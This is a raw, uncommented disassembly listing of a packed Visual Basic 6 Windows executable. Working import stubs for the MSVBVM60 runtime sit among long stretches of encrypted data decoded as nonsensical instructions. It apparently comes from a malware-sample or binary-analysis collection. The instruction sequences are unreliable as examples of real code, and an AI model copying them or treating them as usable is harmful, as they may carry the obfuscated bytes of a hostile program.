push 0x73fadb65
0x2f7139e8 0x119b
sub_4334a7
cmp [ ebp + 0x71385dc7 ] edx
or cl dh
lodsd [ esi ]
add eax 0x8830ec06
mov [ ecx + 0x7542c51 ] al
stosd [ edi ]
insb
and [ ecx + esi * 2 ] 0x49
cmp [ eax ] 0x4b390368
dec edi
aaa
inc ebp
mov [ 0x37cf59f3 ] eax
and ebx [ edi ]
das
sub [ ebx - 0x6c3165a1 ] 0x36e68751
and al 0xad
or al bl
retn 0xe216
sub_434f9c
inc esp
adc al 0xcf
push [ esi + 0x3dba576d ]
add ch [ edx ]
std
jae r-xdata
mov eax 0x17a4ee6a
xor ebx [ ebx - 0x2e ]
jno r-xdata
stc
test eax 0xefc7ff44
sbb eax 0xd835e7ac
loop r-xdata
add al 0xb6
in al 0x3f
pop edi
cwde
push 0xffffffb3
adc cl ch
and edi [ ebx - 0x47aa1798 ]
mov ecx 0xc555eb3f
jb r-xdata
mov esi 0x2235d98e
push cs
xchg ebp eax
bound edi [ esi - 0x63 ]
sbb al 0xce
push es
dec esp
jecxz r-xdata
aas
xchg esi eax
push 0x3a
mov eax 0xffffffff
das
push ecx
fmul [ edi + 0x2cfb1712 ]
inc ebx
jmp r-xdata
sbb [ ebx + 0x16 ] ebx
[ eax ]
sub_437390
adc al 0x5d
xchg esp eax
and ebx [ esi ]
movsd [ edi ] [ esi ]
xor [ edx - 0x69 ] bh
or al 0xb9
jle r-xdata
mov eax [ 0x5508047 ]
cmp [ esi + 0x3fcc57ef ] edi
in eax 0xf9
jmp r-xdata
pop ebp
mov dh 0x8b
add al al
pop ebx
cli
mov esi 0x80e56819
and ebp [ eax - 0x2585588f ]
dec ebp
retn 0x527f
push es
jne r-xdata
sbb eax 0xae22c2a6
and [ esi - 0xa0a6989 ] dh
outsb
mov cl 0xd1
inc ebp
mov eax [ 0x5508047 ]
sub_4380ae
enter 0x6c25 0x34
dec edi
push edi
in al dx
sub [ edx + ebp * 4 ] 0xfffffff9
in al 0xa8
xor [ eax ] ch
dec edi
and esp 0x18
sub bh [ esi - 0x69ca009b ]
push edi
cmp ebx [ eax ]
push es
pop eax
mov eax 0xbd6af960
0x5d0f
sub_438523
pop edi
mov [ ebp - 0x3e736b2c ] 0x85
mov bl 0xf3
pop esp
dec edx
das
pop ss
mov cl 0x8d
outsb
or edi [ esi - 0x61 ]
mov dh [ ebx ]
mov esp 0x1bbe949
add [ edx - 0x290b815d ] dh
0x8121207c 0x2622
or al 0xdf
dec ecx
push 0x4c820a0b
insb
ficom [ edx - 0x671df86b ]
and ah [ edi - 0x6e0a1534 ]
hlt
sub_438989
xchg esp eax
adc eax 0x7383c0b1
cdq
push ss
int 0x64
inc edi
jg r-xdata
js r-xdata
outsb
jns r-xdata
jne r-xdata
bound esp [ ebp - 0x682a903f ]
cmp eax 0xa06c9213
retn 0x7605
nop
leave
shl [ ebx + edx * 8 ] 0x3f
lea edx [ ecx + 0x16 ]

xor cl dl
inc eax
into
push esp
inc edi
inc edx
hlt
loopne r-xdata
xor al 0xd3
aas
add ecx ebp
sub_43bd33
inc [ eax ]
add [ eax ] al
add [ edx + 0x40 ] ch
add [ edx ] al
inc eax
add [ esp + eax ] ah
inc esp
add [ edx + 0x40 ] ch
add [ esp + 0x4280040 ] dh
inc esp
add [ edx + 0x40 ] ch
add ah dl
and al 0x40
add [ esp + eax ] ch
inc esp
add ah cl
int3
sub_40111a
inc ebx
add [ ebx + 0x10043f0 ] bh
add [ eax ] cl
add [ ebp + 0x43f1 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add bh bh
and eax __vbaChkstk@IAT
jmp [ __vbaExceptHandler@IAT ]
__vbaFPException
jmp [ __vbaFPException@IAT ]
_adj_fdiv_m16i
jmp [ _adj_fdiv_m16i@IAT ]
_adj_fdiv_m32
jmp [ _adj_fdiv_m32@IAT ]
_adj_fdiv_m32i
jmp [ _adj_fdiv_m32i@IAT ]
_adj_fdiv_m64
jmp [ _adj_fdiv_m64@IAT ]
_adj_fdiv_r
jmp [ _adj_fdiv_r@IAT ]
_adj_fdivr_m16i
jmp [ _adj_fdivr_m16i@IAT ]
_adj_fdivr_m32
jmp [ _adj_fdivr_m32@IAT ]
_adj_fdivr_m32i
jmp [ _adj_fdivr_m32i@IAT ]
_adj_fdivr_m64
jmp [ _adj_fdivr_m64@IAT ]
_adj_fpatan
jmp [ _adj_fpatan@IAT ]
_adj_fprem
jmp [ _adj_fprem@IAT ]
_adj_fprem1
jmp [ _adj_fprem1@IAT ]
_adj_fptan
jmp [ _adj_fptan@IAT ]
_CIatan
jmp [ _CIatan@IAT ]
_CIcos
jmp [ _CIcos@IAT ]
_CIexp
jmp [ _CIexp@IAT ]
_CIlog
jmp [ _CIlog@IAT ]
_CIsin
jmp [ _CIsin@IAT ]
_CIsqrt
jmp [ _CIsqrt@IAT ]
_CItan
jmp [ _CItan@IAT ]
_allmul
jmp [ _allmul@IAT ]
DllFunctionCall
jmp [ DllFunctionCall@IAT ]
__vbaHresultCheckObj
jmp [ __vbaHresultCheckObj@IAT ]
__vbaSetSystemError
jmp [ __vbaSetSystemError@IAT ]
Ordinal_MSVBVM60_666
jmp [ Ordinal_MSVBVM60_666@IAT ]
__vbaFreeStr
jmp [ __vbaFreeStr@IAT ]
Ordinal_MSVBVM60_610
jmp [ Ordinal_MSVBVM60_610@IAT ]
__vbaStrVarVal
jmp [ __vbaStrVarVal@IAT ]
Ordinal_MSVBVM60_540
jmp [ Ordinal_MSVBVM60_540@IAT ]
__vbaVarMove
jmp [ __vbaVarMove@IAT ]
Ordinal_MSVBVM60_661
jmp [ Ordinal_MSVBVM60_661@IAT ]
__vbaStrVarMove
jmp [ __vbaStrVarMove@IAT ]
__vbaR8IntI4
jmp [ __vbaR8IntI4@IAT ]
__vbaFreeVar
jmp [ __vbaFreeVar@IAT ]
Ordinal_MSVBVM60_606
jmp [ Ordinal_MSVBVM60_606@IAT ]
__vbaVarDup
jmp [ __vbaVarDup@IAT ]
Ordinal_MSVBVM60_650
jmp [ Ordinal_MSVBVM60_650@IAT ]
Ordinal_MSVBVM60_585
jmp [ Ordinal_MSVBVM60_585@IAT ]
Ordinal_MSVBVM60_591
jmp [ Ordinal_MSVBVM60_591@IAT ]
Ordinal_MSVBVM60_587
jmp [ Ordinal_MSVBVM60_587@IAT ]
Ordinal_MSVBVM60_609
jmp [ Ordinal_MSVBVM60_609@IAT ]
Ordinal_MSVBVM60_525
jmp [ Ordinal_MSVBVM60_525@IAT ]
Ordinal_MSVBVM60_713
jmp [ Ordinal_MSVBVM60_713@IAT ]
__vbaStrMove
jmp [ __vbaStrMove@IAT ]
__vbaFreeVarList
jmp [ __vbaFreeVarList@IAT ]
Ordinal_MSVBVM60_546
jmp [ Ordinal_MSVBVM60_546@IAT ]
Ordinal_MSVBVM60_542
jmp [ Ordinal_MSVBVM60_542@IAT ]
__vbaI2Var
jmp [ __vbaI2Var@IAT ]
Ordinal_MSVBVM60_693
jmp [ Ordinal_MSVBVM60_693@IAT ]
EVENT_SINK_QueryInterface
jmp [ EVENT_SINK_QueryInterface@IAT ]
EVENT_SINK_AddRef
jmp [ EVENT_SINK_AddRef@IAT ]
EVENT_SINK_Release
jmp [ EVENT_SINK_Release@IAT ]
Ordinal_MSVBVM60_100
jmp [ Ordinal_MSVBVM60_100@IAT ]
sub_4012a0
0x7650
sub_4016c2
add [ eax ] al
hlt
sub_4022c8
mov eax [ rw-data ]
or eax eax
je r-xdata
push r-xdata
mov eax DllFunctionCall
call eax
jmp eax
jmp eax
sub_402324
mov eax [ rw-data ]
or eax eax
je r-xdata
push r-xdata
mov eax DllFunctionCall
call eax
jmp eax
jmp eax
sub_404d41
push esp
add ecx esp
sub edi edx
pop eax
iretd
sub_404da5
and eax [ edx + ebp * 2 ]
mov ebx 0xdb83756e
sub al 0x5
push 0x6a

sub_404db2
sahf
insd
xor [ ebx ] ah
cli
sbb eax 0x6252a820
iretd
sub_404e48
iretd
sub_404e49
mov [ ecx + 0x6b71e0b1 ] ss
xor [ ebx ] ah
push esi
add [ ecx ] dh
dec ebx
add eax 0xfa23307a
sbb eax 0x625aa834
iretd
sub_404eb0
iretd
sub_404fe8
test al 0x22
add eax 0x9194cf6a
imul esi [ eax ] 0x23
cli
std
dec esp
and al [ 0xfffffffffa38d96a ]
xchg ebp eax
iretd
sub_4050db
sub [ eax ] 0xffffffdc
cli
xchg ebp eax
pop edx
and ebp [ edi - 0x6b ]
iretd
sub_4050e7
mov [ 0xffffffffe10549f3 ] eax
sub edi edx
pop eax
iretd
sub_40519a
lds esp [ ebp - 0x21 ]
0x2cf0040a 0x616b
sub_4051a4
aas
int3
sub_405ccd
push edi
pushad
cmp al [ edx + 0x4c ]
cmovae dx [ eax + 0x52 ]
push 0xffffffd8
cwde
hlt
sub_405d1e
into
fwait
iretd
j_sub_405f87
jmp sub_405f87
sub_405f87
push ebx
jo r-xdata
in eax dx
xchg ebp eax
iretd
out 0xef al
inc edi
add [ ecx - 0x4e ] ecx
mov [ ebx + 0x78 ] esi
0xf1de
sub_405f97
add cl 0x30
out dx al
mov ch 0xe0
popfd
xor eax 0x4d8c52ff
or al 0x1f
mov ebx eax
aad 0xed
xchg ebp eax
iretd
sub_405fd9
and eax [ 0xffffffffd7cb306a ]
sahf
iretd
sub_405fe1
fadd [ 0xffffffffed23306a ]
popad
retn
sub_405fe9
fdiv st2
push 0x30
and eax [ 0xfffffffffad25e82 ]
xchg ebp eax
xor [ ebx ] ah
add eax 0xf423d86a
xchg ebp eax
iretd
sub_405ffd

sub_405ffe
push es
push 0x30

sub_406541
mov eax 0xb1384716
push ss
sar [ eax - 0x47 ] 0x1
0x1ff15c48 0xbe4f
sub_406976
out dx al
mov al [ 0xffffffffe2cd5d71 ]
mov dl 0x56
xchg ecx eax
movsd [ edi ] [ esi ]
xor eax 0x893f6756
retn
sub_4069c6
sti
das
jmp sub_4069d7
sub_4069d7
pop ebx
mov edi [ edx + 0x2f ]
cwde
leave
mov bl 0x19
imul esi edi 0xffffff98
mov [ esi ] es
sub_4080d5
jmp [ eax ]
sub_4083f6
push ss
xchg edi eax
push edi
add bh [ esi ]
adc al 0x15
cmp esp edx
xor [ esi - 0xd337959 ] 0xffffffe2
stosb [ edi ]
0x6daf01c2 0x3f1
sub_40846b
clc
test al 0x5a
sbb bl bl
mov ah 0x70
jmp sub_408446
sub_4088d1
retn
sub_4088d2
mov bh 0xcc
mov edx 0xac5f3e4c
xor ecx eax
int3
sub_40b10c
push cs
dec [ edx + eax + 0x2dee3aa3 ]
0x79bb54ea 0x8def
sub_40b5d8
adc ebx [ ecx ]
adc [ edi ] bl
add [ eax + ebp - 0x44 ] edi
sub ah [ esi ]
pop ebp
int3
sub_40d49c
sbb [ edx - 0x9 ] ecx
xchg edx eax
add dl [ eax + ecx * 4 ]
les edx [ esi + 0x1c131e18 ]
std
pop edx
bound esp [ eax - 0x2e ]
iretd
sub_40d4d3
pop ss
mov bl 0x97
aam 0xef
mov dl 0x9
jecxz r-xdata
aas
cld
fcomip st3
hlt
iretd
sub_40ddd8
push 0xfd762cc6
loop r-xdata
jg r-xdata
sbb edi esp
sub_411d53
jmp eax
sub_412e4d
push ebx
adc [ ebx - 0x49 ] ch
mov ecx 0x37c23e21
retn 0xf78
sub_412f32
salc
iretd
sub_4133dd
das
insd
adc eax esi
sbb [ edi - 0x8888cb7 ] 0x50
leave

sub_4133ea
mov [ edi - 0x6a45da36 ] esp
pop ebx
imul [ esi ]
retn
sub_413b76
lodsd [ esi ]
in eax 0x24
adc [ ebp + 0xa ] dh
into
[ ebp + 0x31 ]
sub_413b80
in al 0xc
mov eax [ 0x663ee81a ]
insb
or ebp [ edx + 0x28 ]
xchg ebp eax
sbb al 0xdb
xchg edx eax
and [ es : ecx + edi ] 0x0
sub eax 0x4fb3c4eb
arpl bp sp
xchg esp eax
int3
sub_414dd0
movsx esp [ ebx ]
stosd [ edi ]
adc al 0x26
retn 0xcb83
sub_4151f6
push ebp
and esi esp
int3
sub_416376
push ds
[ ss : esi ] [ edi ]
pop edx
mov [ 0xd722af8 ] al
hlt
sub_417578
xchg esp eax
insb
push ecx
xchg ebx eax
jmp [ ecx - 0x62e893fa ]
sub_419ef0
jmp [ edx + edx * 2 - 0x64 ]
sub_41b551
push esp
xchg ebx eax
cmc
mov esi [ ebp - 0x5720537a ]
iretd
sub_41bd1e
retn 0xd29f
sub_41cab2
aaa
aam 0x42
insb
out 0x14 eax
cmpsd [ esi ] [ edi ]
lodsb [ esi ]
das
out 0xfe al
iretd
sub_41d399
stc
bound esp [ eax - 0x10 ]
aad 0x67
push ebx
0x619f
sub_41d839
out dx al
push cs
sahf
out dx al
stc
jb r-xdata
sti
enter 0x4b2f 0xa8

adc [ edi ] ebp
in al 0xfb
sub_41dc76
mov esi 0x806e80ee
xchg [ ecx ] dh
push cs
mov [ 0x7297cea3 ] al
0xd159
sub_41e581
xchg ebp eax
and al 0xc7
cmpsb [ esi ] [ edi ]
dec eax
mov eax 0xbcec29b2
int3
sub_41e5b8
dec esp
imul [ ecx ]

sub_41f776
sub [ ebx + edx * 4 + 0x12 ] edx
cmpsb [ esi ] [ edi ]
fnstenv [ ebp - 0x16a51782 ]
mov [ ecx - 0x74 ] 0xa536ac00
leave
iretd
sub_41fcdd
jmp [ 0xffffffff9866461f ]
sub_420476
int1
mov esi esp
retn
sub_420487
xor ah [ esi - 0x3aa02c1a ]
push edi
0x4990
sub_420495
shr [ edx - 0x7448dc2a ] 0x1
xor [ ecx ] dh
popad
xchg [ edx + 0x6a ] bh
sti
jecxz r-xdata
int3
sub_4205cf
dec esp
int3
sub_4216ef
push eax
or eax 0x6bfe6d10
dec ebp
cmp [ esi - 0x76666c83 ] ebx
cld
mov edx 0x3ff3a880
xor [ 0xffffffffa631ca04 ] edx
dec ebp
out dx eax
add al ch
iretd
sub_421f76
push 0xfd0adab9
or al 0xf4
cmpsb [ esi ] [ edi ]

sub_421f94
0xbe52
sub_421ff8
inc edx
div [ edi - 0x1080e8d7 ]
add [ esi ] dl
pushfd
mov ch 0x56
pop edi
clc
and ax 0x67a2
int3
sub_4220b6
push edi
sbb al 0x23
arpl si ax
or bh [ ebp + 0x20 ]
bound edx [ ebp + 0x785ea679 ]
add [ ebx ] dh
sub [ fs : esi + ebx * 4 + 0x72 ] ecx
mov eax [ 0xffffffffd78464d2 ]
jo r-xdata
test bh dl
scasd [ edi ]
iretd
sub_4220d5
xchg ebx eax
aad 0x5f
xor [ eax + 0x28 ] eax
jmp [ esi - 0x6c ]
sub_4228b3
push es
pop ss
pop esi
fst [ 0xffffffffb23224e4 ]
retn 0x359
sub_4228bf
retn 0x74e8
sub_4229a4
call [ ecx ]
sub ebp [ eax - 0x2c27724f ]
sbb eax ecx
mov esi 0x74264792
dec eax
mov fs [ edx + 0x9 ]
test [ ebx + 0x2292f481 ] edi
dec eax
sub [ edx ] 0x83004a91
int3
sub_425660
retn 0x3764
sub_42683c
push [ esi + 0x38 ]
sbb [ eax ] ch
ftst
0xf48043cd 0x9a5f
stosb [ edi ]
xchg edx eax
retn
sub_42684d
cmp ebx eax
pop ebx
retn
sub_42685e
cmp al 0x8a
iretd
sub_426bd4
rcl [ edi + ebp * 4 - 0x51e2e464 ] 0x1
movsb [ edi ] [ esi ]
or al 0xe9
int 0x3a
in eax 0xaa
mov bl 0x17
aaa
sahf
iretd
sub_426cdf
mov [ eax - 0x54 ] cl
mov ah 0xe4
and ebx edx
or ch [ eax ]
mov dl 0x1
0x3c6
sub_426ff6
iretd
sub_426ff7
add bl [ eax - 0x4c9fb115 ]
cwde
shr esp 0x1
cmpsb [ esi ] [ edi ]
0x6257
sub_42702f
lahf
hlt
sub_42a250
dec esp
pop es
add al 0x84
or eax 0xb13199c9
sti
pop edi
retn
sub_42a609
aaa
pop es
sub al 0xc3
0x6192
sub_42ae76
sbb [ edx + edi - 0x6b ] edx
or eax 0x41467e3a
cmp eax 0x71a9c198
sahf
pop eax
0xbc66e4c2 0xa2f1
sub_42e8c3
push es
mov esp 0x6396e17e
xlat
loopne r-xdata
imul esp [ ebp + 0x5a ] 0x8
outsb
jge r-xdata
retn 0x72f0
push ecx
0xd1a3
sub_42e8f8
aas
cmpsb [ esi ] [ edi ]
iretd
sub_42e913
add al 0xcb
inc edx
or esp [ edx + edi - 0x23 ]
outsb
sub cl dh
0xaeaf
sub_42e923
sbb ah [ edi ]
retn 0xfea0
sub_42e9cf
[ edx - 0x38 ]
sub_42eda4
cmp esp [ ebp - 0x6a ]
xchg edi eax
pushfd
inc esi
and al 0xa6
xor [ eax + 0x6d7048e5 ] al
int3
sub_42f747
retn 0x106d
sub_42faaf
push edi
mov cl 0xe6
push esp

sub_42fbe0
sub eax 0xede23985
iretd
sub_42fbe6
cmpsb [ esi ] [ edi ]
fisub [ ebx - 0x3 ]
jae r-xdata
push ds
pop edx
push ebx
fldenv [ 0x3eb6e43a ]
0xcaa5
sub_430022
[ ebx - 0x439b54a ]
sub_430804
sahf
inc ebx
sar [ edi + 0x57 ] 0x40
push 0x46
sahf
sub al 0xc7
aas
0x1d44
sub_43085d
in al 0xf7
and esp [ ecx - 0x18 ]
xchg [ eax + 0xc ] esi
0xa7b09651 0xb2c4
sub_430c76
push esp
xchg ah dl
sub al 0x5d
fistp [ esi + 0x51ea03b1 ]
adc ecx esp
retn
sub_4310fb
push ecx
cmp bl [ ecx ]
or bh dh
cwde
mov dl 0x3e
imul ebp edx 0x65
inc edi
retn 0xa4ea
sub_431140
dec ebx
inc edx
lea edi [ eax ]
0xd0ab
sub_431a1e
push di
dec edi
sti
pop ecx
cmpsb [ esi ] [ edi ]
sti
add al 0xe4
pop esi
iretd
sub_4326f6
std
pop edi
xchg [ edx ] ecx
0x2881
sub_43315b
shl esi 0x1
sub [ edi + ebx * 4 ] edx
mov bl al
test eax 0xec6c7f97
rcl esp cl
mov [ 0xfffffffffbe3b5e6 ] al
iretd
sub_43393b
in eax 0xb
hlt
sub_434fbf
add esi [ ebp + 0x512116de ]
shr edi 0xf8
retn 0x8c1d
sub_4353f6
adc al 0x5c
hlt
sub_436e76
push esp
dec [ edi - 0x66 ]
mov [ 0xffffffffdf151314 ] eax
test [ esi - 0x5921d50f ] dh
pushfd
jmp [ esi ]
sub_436fc0
push [ esi + 0x31 ]
mov ecx 0x7a409bc
shl [ edi - 0x29c002c7 ] 0x1
pop esi
stc
inc esp
fild [ ebx - 0x3561e190 ]
add ebx [ edx - 0x70 ]
0xc17a
sub_43743c
[ edx + 0x4bf4ece4 ]
sub_437468
lodsd [ esi ]
and dh ah
int3
sub_4378b3
push [ 0xffffffff881ac9d4 ]
pop ds
mov esi 0xd83189ce
pop ss
dec esi
mov bl 0x82

sub_4378c4
dec edi
arpl sp si
inc ecx
jmp edi
sub_437d30
push 0x1e9f00f6
inc esi
mov esi 0x48c7d5bf
fisttp [ eax + 0x4b2f6544 ]
cmc
sub [ eax - 0x1c ] 0x71
lds ebx [ 0xffffffffe422f917 ]
imul edx [ ecx + 0x5ce7de6 ] 0x407b2c11
std
iretd
sub_4381a6
jmp [ ebp - 0x17e09064 ]
sub_4384f6
pop esp
xor ah bh
iretd
sub_4384fa
xchg ebp eax
0xc96fc54e 0xa0ac
sub_438562
push 0xfffffffb
and eax 0xc186c550
in eax dx
sbb ebp [ esi + eax * 4 - 0x11 ]
pop ebx
pop ebx
rcl [ ebx - 0x30dcd121 ] 0x1
iretd
sub_4389b0
mov ch 0xec
cmc
xor [ edi - 0x65 ] 0x18c81c25
cmp ebx [ ecx - 0x600a07e0 ]
in al 0x4e

sub_4389ea
mov ebp 0x9f70d3a
xchg esi eax
iretd
sub_438e45
pop ebp
insd
std
cli
int3
sub_4398f6
retn 0xaa9b
